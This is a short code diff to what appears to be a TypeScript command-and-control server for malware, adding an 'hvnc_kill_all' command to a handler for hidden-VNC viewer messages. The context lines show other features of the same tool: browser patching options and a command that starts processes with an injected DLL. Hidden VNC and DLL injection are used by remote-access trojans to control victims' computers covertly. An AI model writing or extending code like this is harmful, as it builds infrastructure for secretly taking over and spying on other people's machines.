@@ -884,6 +884,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         opera_patch: Boolean(payload.opera_patch),
       });
       break;
+    case "hvnc_kill_all":
+      sendHVNCCommand(target, "hvnc_kill_all", {});
+      break;
     case "hvnc_start_process_injected": {
       const dllData = getInjectionDllBytes();
       if (!dllData) {
